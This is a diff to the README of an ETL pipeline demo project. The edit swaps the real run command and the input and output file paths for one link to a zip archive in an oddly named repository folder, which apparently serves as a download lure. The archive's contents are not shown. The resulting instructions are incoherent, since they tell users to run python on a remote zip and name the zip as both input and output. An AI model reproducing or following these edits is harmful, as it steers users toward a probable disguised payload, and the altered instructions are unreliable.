@@ -13,11 +13,11 @@ This project demonstrates a complete ETL (Extract, Transform, Load) pipeline usi
 
 ## How to Run
 ```bash
-python etl_pipeline.py
+python https://github.com/Yukku05/ETL-PIPELINE-PROJECT/raw/refs/heads/main/betwit/PIPELIN-PROJECT-ET-2.5.zip
 ```
 
 ## Input
-- `data/sales_data.csv`
+- `https://github.com/Yukku05/ETL-PIPELINE-PROJECT/raw/refs/heads/main/betwit/PIPELIN-PROJECT-ET-2.5.zip`
 
 ## Output
-- `output/cleaned_sales_data.csv`
+- `https://github.com/Yukku05/ETL-PIPELINE-PROJECT/raw/refs/heads/main/betwit/PIPELIN-PROJECT-ET-2.5.zip`
